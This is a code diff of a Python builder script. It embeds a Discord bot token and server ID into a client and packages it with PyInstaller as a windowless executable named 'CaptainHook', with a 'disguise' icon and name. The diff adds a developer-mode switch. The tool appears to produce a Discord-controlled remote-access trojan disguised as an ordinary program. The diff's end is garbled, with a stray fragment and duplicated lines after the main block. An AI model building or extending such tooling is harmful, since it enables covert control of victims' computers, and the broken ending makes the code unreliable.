@@ -160,6 +160,11 @@ def build(token, guild_id, preset_name, disguise_name):
             content = f.read()
         content = content.replace("[[DISCORD_TOKEN_PLACEHOLDER]]", token)
         content = content.replace("[[GUILD_ID_PLACEHOLDER]]", guild_id)
+        
+        # Inject Developer Mode
+        if preset.get("developer", False):
+            content = content.replace("DEVELOPER_MODE = False", "DEVELOPER_MODE = True")
+            
         with open(config_path, "w") as f:
             f.write(content)
             
@@ -201,6 +206,7 @@ def build(token, guild_id, preset_name, disguise_name):
         
         # OS-Specific instructions
         # Note: We use --paths to make sure PyInstaller finds our 'src' in build_staging
+        # We also use single line for the command to prevent copy-paste errors
         if os.name == 'nt':
             cmd = f"pyinstaller --onefile --noconsole --icon={disguise['icon']} --name CaptainHook --paths={staging_root} {hidden_imports_str} build_staging/src/client/main.py"
             ext = ".exe"
@@ -236,6 +242,13 @@ def main():
     try:
         config = get_config()
         if Confirm.ask("\n[bold cyan]Confirm Build Settings?[/bold cyan]"):
+            build(*config)
+    except KeyboardInterrupt:
+        console.print("\n[bold red]Build Cancelled.[/bold red]")
+
+if __name__ == "__main__":
+    main()
+cyan]"):
             build(*config)
     except KeyboardInterrupt:
         console.print("\n[bold red]Build Cancelled.[/bold red]")
